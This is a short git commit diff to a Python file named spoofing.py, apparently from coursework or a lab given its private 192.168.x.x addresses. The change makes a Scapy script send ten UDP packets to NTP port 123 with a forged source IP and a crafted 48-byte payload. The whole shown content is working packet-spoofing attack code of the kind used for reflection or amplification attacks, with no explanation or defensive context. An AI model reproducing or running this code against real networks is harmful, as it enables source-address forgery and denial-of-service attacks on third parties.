9fc473c55d48c7b6aafcd81a02662a6167b6458e
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-14 01:06:48 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -5,5 +5,5 @@ A= "192.168.30.1"
 B= "192.168.20.1"
 C= '\x1e' + '\x00' * 47
 
-spoofed_packet = IP(src=A, dst=B) / UDP(sport=RandShort(), dport=123) / E
+spoofed_packet = IP(src=A, dst=B) / UDP(sport=RandShort(), dport=123) / C
 send(spoofed_packet, count=10)
